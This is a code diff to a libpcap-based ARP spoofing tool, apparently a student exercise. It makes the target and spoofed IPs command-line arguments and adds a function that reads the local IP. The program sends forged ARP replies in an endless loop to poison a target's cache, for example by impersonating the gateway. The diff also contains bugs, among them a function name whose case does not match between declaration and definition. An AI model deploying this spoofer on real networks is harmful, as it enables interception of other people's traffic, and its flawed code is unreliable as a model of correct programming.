@@ -32,7 +32,7 @@ struct libnet_ethernet_hdr
 };
 #pragma pack(pop)
 
-
+int getMy_Ip(char *my_ip);
 int getMacAddress(uint8_t *mac);
 void convrt_mac(const char *data, char *cvrt_str, int sz);
 void usage() {
@@ -41,7 +41,7 @@ void usage() {
 }
 
 int main(int argc, char* argv[]) {
-    if (argc != 2) {
+    if (argc != 4) {
 		usage();
 		return -1;
 	}
@@ -58,12 +58,12 @@ int main(int argc, char* argv[]) {
       
     uint8_t me_mac[6];
     uint8_t you_mac[6]={0,};
-
+    char my_ip[20];
     //Get my mac
     printf("get mac address function start \n");
     getMacAddress(me_mac);
     printf("get mac address function finish \n");
-              
+    getMy_IP(my_ip);          
     //ARP request 'Get You mac'
     packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
     packet.eth_.smac_ =Mac(me_mac);
@@ -75,9 +75,9 @@ int main(int argc, char* argv[]) {
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(me_mac);
-    packet.arp_.sip_ = htonl(Ip("192.168.1.131"));
+    packet.arp_.sip_ = htonl(Ip(my_ip));
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arp_.tip_ = htonl(Ip("192.168.1.118"));
+    packet.arp_.tip_ = htonl(Ip(argv[2]));
     EthArpPacket reply_packet;
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -124,9 +124,9 @@ int main(int argc, char* argv[]) {
     Spoofing_packet.arp_.pln_ = Ip::SIZE;
     Spoofing_packet.arp_.op_ = htons(ArpHdr::Reply);
     Spoofing_packet.arp_.smac_ = Mac(me_mac);
-    Spoofing_packet.arp_.sip_ = htonl(Ip("192.168.1.1"));
+    Spoofing_packet.arp_.sip_ = htonl(Ip(argv[3]));
     Spoofing_packet.arp_.tmac_ = Mac(you_mac);
-    Spoofing_packet.arp_.tip_ = htonl(Ip("192.168.1.118"));
+    Spoofing_packet.arp_.tip_ = htonl(Ip(argv[2]));
 
     //Send arp reply packet
     while(1)
@@ -140,7 +140,34 @@ int main(int argc, char* argv[]) {
     }
 pcap_close(handle);
 }
+int getMy_IP(char *my_ip)
+{
+    int sock;
+    struct ifreq ifr;
 
+
+    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
+    if (sock < 0)
+    {
+        perror("socket");
+        close(sock);
+        return -1;
+    }
+    printf("socket good\n");
+    strcpy(ifr.ifr_name, "enp0s3");
+    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0)
+    {
+        perror("ioctl() - get ip");
+        close(sock);
+        return -1;
+    }
+    struct sockaddr_in *addr;
+    addr =(struct sockaddr_in*)&ifr.ifr_addr;
+    memcpy(my_ip, inet_ntoa(addr-> sin_addr), sizeof(ifr.ifr_addr));
+    close(sock);
+    return 1;
+
+}
 
 
 int getMacAddress(uint8_t *mac)
